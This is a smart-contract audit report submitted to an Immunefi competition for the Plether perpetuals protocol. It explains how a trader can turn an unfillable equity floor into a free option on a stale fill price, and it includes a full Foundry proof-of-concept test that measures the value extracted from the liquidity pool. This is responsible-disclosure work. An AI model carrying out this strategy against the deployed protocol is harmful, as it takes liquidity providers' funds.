# \#99623 [SC-Low] An order whose equity floor is unreachable can only be executed by its owner, giving the trader a free option on an already-known fill price

**Submitted on Nov 14th 2026 at 14:33:33 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99623
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


**Summary**

A queued order's fill price is fixed at the first oracle tick after commit, but whether it can execute depends on account state only the owner can change. A trader commits an order with `minPostPositionEquityAssets` set just above the equity the position will have. Any keeper attempt fails on that constraint and ends the order; the trader loses at most the 0.20 USDG bounty, or nothing for a partial close, and can commit again. If no keeper has attempted it yet and the basket moves in his favour, he calls `addMargin`, which lifts equity over the floor, and executes the order himself at the old tick. If it moves against him, he lets it expire and gets his bounty back. He keeps the good fills and discards the bad ones, and the pool pays the difference. In the PoC the trader nets +1,306 USDG after a 0.5% move.

**Description**

Paths are relative to `packages/perps/src`.

*The fill price is fixed at commit.* Execution parses only the first Pyth tick after `commitTime` (`PletherOracle.sol:610-614`). The order stays executable until its deadline, up to 60 seconds (`router/OrderLiquidationBatchLogic.sol:287`). The fill price is public for that time while the market moves.

*The equity floor is checked against live state.* `minPostPositionEquityAssets` is trader-set (`OrderV3Types.sol:149`). The evaluator compares it with post-execution equity, and a shortfall is a terminal constraint failure (`CfdOrderPolicyEvaluatorBase.sol:529-536`). The same holds for `minPostSettlementBalanceAssets` (`:520-524`), which a plain deposit raises; this covers full closes, where the equity floor is not checked (`:526-528`).

*Only the owner can change that state.* `addMargin` is owner-only, takes effect at once, and does not check for pending orders (`CfdEngine.sol:501-530`). Deposits likewise. Nobody else can make the order feasible.

*Self-execution is allowed and free.* Execution is permissionless; when the account is the executor, its own bounty is released back to it (`OrderRouter.sol:336-338`).

*Attack path.* The trader holds a position and free balance.

1. Commit an order on the position with the equity floor slightly above the equity it will have. The fill price fixes one tick later.
2. If a keeper attempts it, the attempt fails on the constraint. The order ends, the keeper is paid the bounty (at most 0.20 USDG; zero for a partial close), and the trader commits again.
3. Otherwise watch the price for the rest of the window.
4. On a favourable move, `addMargin`, self-execute at the old tick, then close at the current price.
5. On an adverse move, do nothing; the order expires and the bounty is refunded.

*Why keepers cannot stop it.* Normally a fast keeper binds the trader by filling first. Here any other executor can only fail, so the default outcome is "no fill". A keeper attempt does end the option, so its life is the keeper delay rather than the full window, but each failed attempt costs the trader at most 0.20 USDG and he simply reopens it. Partial-close orders pay no bounty, so they are the cheapest vehicle.

*What this contradicts.* `SECURITY.md:658-659` lists as a security property that binding order semantics "prevent traders from turning queued intents into free options". `WHITEPAPER.md:1137` says binding orders "reduce" that ability; this path removes the reduction entirely. SC-M4 in the pre-audit report (free option via the 60-second window) was fixed by fixing the fill tick at commit; this bypasses that fix because feasibility, not price, is what the trader controls. It is not the clock-alignment limitation in `SECURITY.md:701-711`, where a possibly-seen tick still fills the order; here the trader decides whether it fills at all.

*Recommended fix.* Make feasibility independent of owner actions after commit: evaluate the owner-controlled bounds (`minPostPositionEquityAssets`, `minPostSettlementBalanceAssets`, `maxPostLeverageBps`) against a snapshot of account state taken at commit, and reject at commit any order whose bounds are not already satisfiable. Banning self-execution is not sufficient; a second address defeats it.

**Impact**

Direct theft of user funds, whether at-rest or in-motion. The trader's gain is paid out of the pool, which is LP capital, and the trader keeps it.

- **Size:** the favourable basket move before the first keeper attempt, times notional, less two 4 bps execution fees. In the PoC, +1,306 USDG after a 0.5% move.
- **Cost of a failed try:** at most 0.20 USDG, or nothing for a partial close.
- **Conditions:** an existing position and a move exceeding 8 bps inside the window, so it pays mainly around scheduled data releases. A second or so of price risk remains between self-execution and the closing fill.
- **Repeatable:** every order is a fresh option, bounded only by position and skew caps.

## Proof of Concept

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/spec/trader/UnreachableEquityFloorFreeOption.t.sol` and run:

```
forge test --root packages/perps --match-contract UnreachableEquityFloorFreeOptionTest -vvv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice A queued order's fill price is pinned to the first Pyth tick after `commitTime`, but whether the order
///         may execute at all depends on `minPostPositionEquityAssets`, a trader-authored bound measured against
///         live account state. Only the owner can raise that state (`CfdEngine.addMargin`, owner-only, no pending-order
///         check). An order whose floor is unreachable at commit is therefore executable by nobody except its owner,
///         who decides after watching the market whether the already-known fill price is worth taking.
///
/// The test runs the same committed order down six branches from one snapshot:
///   A. a keeper attempts it            -> terminal PostPositionEquity failure; the fill cannot be forced;
///   B. price rises, owner exercises    -> addMargin, self-execute at the stale tick, close at the new price;
///   C. price rises, owner abandons     -> the counterfactual for B, isolating the exploited slice;
///   D. price falls, owner exercises    -> the loss a bound trader would take;
///   E. price falls, owner abandons     -> the loss the free option avoids;
///   F. price falls, nothing committed  -> the cost of holding the option, which is at most its capped bounty.
///
/// Branches share one seeded position and one final timestamp, so the seed's own PnL cancels inside each pair.
/// (B - C) is the value extracted on a favourable move; (E - D) is the loss avoided on an adverse one. A bound trader
/// faces both; this trader keeps the first and discards the second.
///
/// Run:
///   forge test --root packages/perps --match-contract UnreachableEquityFloorFreeOptionTest -vvv
contract UnreachableEquityFloorFreeOptionTest is BasePerpTest {

    address private constant ALICE = address(0xA11CE);
    address private constant KEEPER = address(0xBEEF);

    /// Basket marks in oracle units (1e8). The option window move is 50 bps either way.
    uint256 private constant P0 = 100_000_000;
    uint256 private constant P_UP = 100_500_000;
    uint256 private constant P_DOWN = 99_500_000;

    /// Pool depth is BasePerpTest's default ~1,002,000 USDG, so 390,000 of LONG notional stays inside the 40% cap.
    uint256 private constant SEED_SIZE = 100_000e18;
    uint256 private constant SEED_MARGIN = 10_000e6;
    uint256 private constant OPTION_SIZE = 290_000e18;
    uint256 private constant OPTION_MARGIN = 10_000e6;

    /// The floor is set this far above the equity the order would leave, and cleared by this top-up. Both are large
    /// relative to the order's own fee and VPI, so neither branch depends on the preview matching the evaluator to
    /// the atom.
    uint256 private constant FLOOR_GAP = 2000e6;
    uint256 private constant TOP_UP = 8000e6;

    uint32 private constant WINDOW = 60;
    /// Live market: BasePerpTest's FAD boundary, minus an hour. Asserted below.
    uint256 private constant LIVE_START = 1_729_283_399 - 1 hours;
    /// Every branch marks and closes at the same wall clock so carry and staleness cannot differ between them.
    uint256 private constant SETTLE_AT = LIVE_START + 120;

    struct Branch {
        uint256 traderCash;
        uint256 poolCash;
        uint256 equityFloor;
    }

    /// Release risk parameters (DEPLOYMENT.md). VPI stays enabled: the trader pays it on the way in, which makes
    /// this measurement conservative rather than generous.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(ALICE, 200_000e6);
        // Timestamp reads must cross the cheatcode boundary: via-IR may reuse block.timestamp across vm.warp.
        assertGt(LIVE_START, vm.getBlockTimestamp(), "fixture: the scenario clock must run forward from setUp");
        vm.warp(LIVE_START);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(P0, uint64(vm.getBlockTimestamp()));
        assertFalse(engine.isFadWindow(), "fixture: the scenario must run in the live regime");
    }

    function test_UnreachableEquityFloorIsAnOwnerOnlyFillAndAFreeOption() public {
        _seedPosition();
        uint256 root = vm.snapshotState();

        // The floor the owner commits: just above the equity this very order would leave at the pinned price.
        uint256 floor_ = _unreachableFloor();
        assertTrue(vm.revertToState(root));

        // A. No keeper can force the fill.
        _assertKeeperCannotForceTheFill(floor_);
        assertTrue(vm.revertToState(root));

        // B/C. Favourable move: exercise versus abandon.
        Branch memory exercisedUp = _runBranch(floor_, true, P_UP);
        assertTrue(vm.revertToState(root));
        Branch memory abandonedUp = _runBranch(floor_, false, P_UP);
        assertTrue(vm.revertToState(root));

        // D/E. Adverse move: the loss a bound trader eats versus the loss this one walks away from.
        Branch memory exercisedDown = _runBranch(floor_, true, P_DOWN);
        assertTrue(vm.revertToState(root));
        Branch memory abandonedDown = _runBranch(floor_, false, P_DOWN);
        assertTrue(vm.revertToState(root));

        // F. The same adverse move with no order ever committed: the cost of holding the option.
        Branch memory noOrderDown = _runNoOrderBranch(P_DOWN);
        vm.deleteStateSnapshot(root);

        // 1. Exercising a stale fill after a favourable move pays, net of both execution fees and round-trip VPI.
        assertGt(exercisedUp.traderCash, abandonedUp.traderCash, "exercising the stale fill must pay the owner");
        // 2. The same fill after an adverse move would have cost the owner, and he simply does not take it.
        assertGt(abandonedDown.traderCash, exercisedDown.traderCash, "abandoning must avoid a real loss");
        // 3. The gain is paid out of pool cash, which is LP capital.
        assertGt(abandonedUp.poolCash, exercisedUp.poolCash, "the extracted value leaves the pool");

        uint256 extracted = exercisedUp.traderCash - abandonedUp.traderCash;
        uint256 avoided = abandonedDown.traderCash - exercisedDown.traderCash;
        uint256 poolPaid = abandonedUp.poolCash - exercisedUp.poolCash;

        emit log_named_decimal_uint("equity floor committed", floor_, 6);
        emit log_named_decimal_uint("trader cash, up + exercised", exercisedUp.traderCash, 6);
        emit log_named_decimal_uint("trader cash, up + abandoned", abandonedUp.traderCash, 6);
        emit log_named_decimal_uint("trader cash, down + exercised", exercisedDown.traderCash, 6);
        emit log_named_decimal_uint("trader cash, down + abandoned", abandonedDown.traderCash, 6);
        emit log_named_decimal_uint("trader cash, down + never committed", noOrderDown.traderCash, 6);
        emit log_named_decimal_uint("value extracted on the favourable move", extracted, 6);
        emit log_named_decimal_uint("loss avoided on the adverse move", avoided, 6);
        emit log_named_decimal_uint("pool cash paid out for the extracted value", poolPaid, 6);

        // The pool funds the whole gross move; the trader keeps it net of the two execution fees, which are
        // protocol revenue rather than LP value.
        assertGe(poolPaid, extracted, "pool outflow covers the trader's gain");

        // 4. Holding and then abandoning the option is free: the owner ends within the capped 0.20 USDG bounty of
        //    the branch in which he never committed anything at all.
        assertApproxEqAbs(
            abandonedDown.traderCash,
            noOrderDown.traderCash,
            200_000,
            "abandoning costs at most the capped bounty"
        );
    }

    // --- Branches ---

    /// @dev Prices the committed order at the pinned mark and returns a floor one FLOOR_GAP above the equity it
    ///      would leave. Uses the Engine's own open preview, so no hand-computed fee or VPI arithmetic is assumed.
    function _unreachableFloor() private returns (uint256 floor_) {
        ICfdEngineTypes.OpenPreview memory preview =
            engineLens.previewOpen(ALICE, CfdTypes.Side.LONG, OPTION_SIZE, OPTION_MARGIN, P0);
        assertTrue(preview.valid, "fixture: the option order must be admissible but for its own floor");
        assertGt(preview.postEquityAssets, int256(0), "fixture: the order must leave positive equity");
        floor_ = uint256(preview.postEquityAssets) + FLOOR_GAP;
    }

    /// @dev A. Any executor other than the owner can only fail. The failure is terminal, so the order leaves the
    ///      queue and the keeper is paid for an attempt that moved no risk.
    function _assertKeeperCannotForceTheFill(
        uint256 floor_
    ) private {
        uint256 keeperCashBefore = clearinghouse.balanceAssets(KEEPER);
        (uint64 id, uint64 commitTime) = _commitOptionOrder(floor_);
        uint256 bounty = router.lifecycleBook().pendingIntent(id).executionBountyAssets;
        assertGt(bounty, 0, "fixture: an open-side order reserves a bounty");
        assertLe(bounty, 200_000, "the whole cost of a failed attempt is the capped 0.20 USDG bounty");

        _warpInsideWindow(commitTime, 30);
        bytes[] memory data = _mockPythUpdateData(P0);
        vm.recordLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        OrderV3Types.OrderReceipt memory receipt = _finalizedReceipt(id);

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "keeper attempt must fail");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the failure must be the trader's own bound, not an oracle or liveness condition"
        );
        assertEq(
            receipt.failure.selector,
            ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
            "the failure is the evaluator's own constraint revert"
        );
        assertEq(
            uint8(receipt.failure.constraint),
            uint8(OrderV3Types.ConstraintKind.PostPositionEquity),
            "the binding constraint must be the post-position equity floor"
        );
        assertEq(receipt.failure.limit, floor_, "the limit is the committed floor");
        assertLt(receipt.failure.actual, floor_, "live equity sits below the floor the owner chose");
        assertEq(receipt.economics.postPositionSize, SEED_SIZE, "no risk moved");
        assertEq(router.lifecycleBook().pendingIntent(id).account, address(0), "the order left the queue");
        assertEq(
            clearinghouse.balanceAssets(KEEPER), keeperCashBefore + bounty, "the keeper is paid for the dead attempt"
        );
    }

    /// @dev B-E. Commits the order, waits 30 seconds of the 60-second window, then either exercises the pinned fill
    ///      (addMargin, self-execute) or abandons it (expire after the deadline). Both paths end at SETTLE_AT with
    ///      the whole position closed at `finalPrice`, so the returned cash is fully realized.
    function _runBranch(
        uint256 floor_,
        bool exercise,
        uint256 finalPrice
    ) private returns (Branch memory outcome) {
        outcome.equityFloor = floor_;
        (uint64 id, uint64 commitTime) = _commitOptionOrder(floor_);
        uint256 entryCostBefore = engine.positionEntryCostAssetAtoms(ALICE);

        _warpInsideWindow(commitTime, 30);

        if (exercise) {
            // The owner alone can make his own order feasible, after the window's price action is already public.
            vm.prank(ALICE);
            engine.addMargin(ALICE, TOP_UP);

            bytes[] memory data = _mockPythUpdateData(P0);
            vm.recordLogs();
            vm.prank(ALICE);
            OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
            OrderV3Types.OrderReceipt memory receipt = _finalizedReceipt(id);

            assertEq(
                uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "the owner's own attempt succeeds"
            );
            assertEq(receipt.executor, ALICE, "the owner is the only possible executor of this order");
            assertEq(uint8(receipt.executionMode), uint8(OrderV3Types.ExecutionMode.Live), "live regime");
            // The core mechanic: the fill is the tick one second after commit, taken half a minute later.
            assertEq(receipt.executionPrice, P0, "the fill uses the price pinned at commit, not the current one");
            assertEq(receipt.oraclePublishTime, commitTime + 1, "the fill tick is the first one after commitTime");
            assertEq(receipt.economics.postPositionSize, SEED_SIZE + OPTION_SIZE, "the stale fill installed real risk");
            assertEq(
                engine.positionEntryCostAssetAtoms(ALICE) - entryCostBefore,
                (OPTION_SIZE * P0) / 1e20,
                "the new slice was booked at the stale price"
            );
            assertEq(receipt.bountyRecipient, ALICE, "self-execution returns the reserved bounty to the owner");
        } else {
            // Nothing is required of the owner to walk away: the order dies on its own deadline.
            vm.warp(uint256(commitTime) + WINDOW + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(ALICE);
            OrderV3Types.ExecutionResult memory result = router.expireOrder(id);
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the order expires unfilled");
            assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "expired, not executed");
            (uint256 size,,,,,,) = engine.positions(ALICE);
            assertEq(size, SEED_SIZE, "the abandoned order left the position untouched");
        }

        assertEq(router.pendingOrderCounts(ALICE), 0, "no reservation survives the branch");

        Branch memory settled = _settle(finalPrice);
        outcome.traderCash = settled.traderCash;
        outcome.poolCash = settled.poolCash;
    }

    /// @dev F. The counterfactual in which the owner never queues the option at all, so the only difference from
    ///      the abandon branch is the reserved-and-refunded bounty.
    function _runNoOrderBranch(
        uint256 finalPrice
    ) private returns (Branch memory outcome) {
        outcome = _settle(finalPrice);
    }

    /// @dev Marks the basket where it actually went and closes the whole position there, so the measured cash is
    ///      fully realized. Every branch settles at the same wall clock.
    function _settle(
        uint256 finalPrice
    ) private returns (Branch memory outcome) {
        vm.warp(SETTLE_AT);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(finalPrice, uint64(vm.getBlockTimestamp()));
        (uint256 openSize,,,,,,) = engine.positions(ALICE);
        _close(ALICE, CfdTypes.Side.LONG, openSize, finalPrice);
        (uint256 residual,,,,,,) = engine.positions(ALICE);
        assertEq(residual, 0, "the branch ends flat so the measured cash is fully realized");

        outcome.traderCash = clearinghouse.balanceAssets(ALICE);
        outcome.poolCash = settlementToken.balanceOf(address(pool));
    }

    // --- Fixture helpers ---

    /// @dev The position the floor is measured against. `addMargin` needs an open position, so the owner holds one
    ///      before committing. A plain keeper fills this one promptly at its own pinned tick.
    function _seedPosition() private {
        OrderV3Types.OrderRequest memory request = _request(SEED_SIZE, SEED_MARGIN, 0);
        vm.prank(ALICE);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(P0);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "fixture: seed must execute");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, SEED_SIZE, "fixture: seed position size");
    }

    function _commitOptionOrder(
        uint256 floor_
    ) private returns (uint64 id, uint64 commitTime) {
        OrderV3Types.OrderRequest memory request = _request(OPTION_SIZE, OPTION_MARGIN, floor_);
        commitTime = uint64(vm.getBlockTimestamp());
        vm.prank(ALICE);
        id = router.commitOrder(request);
        assertEq(
            router.lifecycleBook().pendingIntent(id).timing.executionDeadline,
            commitTime + WINDOW,
            "fixture: the owner holds the option for the full 60-second window"
        );
    }

    function _request(
        uint256 size,
        uint256 margin,
        uint256 equityFloor
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0xF0E0);
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = P0;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 1 hours),
            executionWindowSeconds: WINDOW,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: equityFloor,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Moves the clock well past the pinned tick while leaving the order live. `_mockPythUpdateData` advances
    ///      one further second and publishes at `commitTime + 1` for the queue head, which is the stale tick.
    function _warpInsideWindow(
        uint64 commitTime,
        uint256 elapsed
    ) private {
        vm.warp(uint256(commitTime) + elapsed);
        vm.roll(vm.getBlockNumber() + 1);
        assertLt(vm.getBlockTimestamp(), uint256(commitTime) + WINDOW, "fixture: still inside the execution window");
    }

    function _finalizedReceipt(
        uint64 id
    ) private returns (OrderV3Types.OrderReceipt memory receipt) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        address book = address(router.lifecycleBook());
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].emitter != book || logs[i].topics.length != 4) {
                continue;
            }
            if (logs[i].topics[0] != IOrderLifecycleBook.OrderFinalized.selector) {
                continue;
            }
            if (uint64(uint256(logs[i].topics[1])) != id) {
                continue;
            }
            (,,, receipt) = abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
            assertEq(receipt.orderId, id, "receipt identity");
            return receipt;
        }
        revert("no OrderFinalized receipt for this order");
    }

}
```
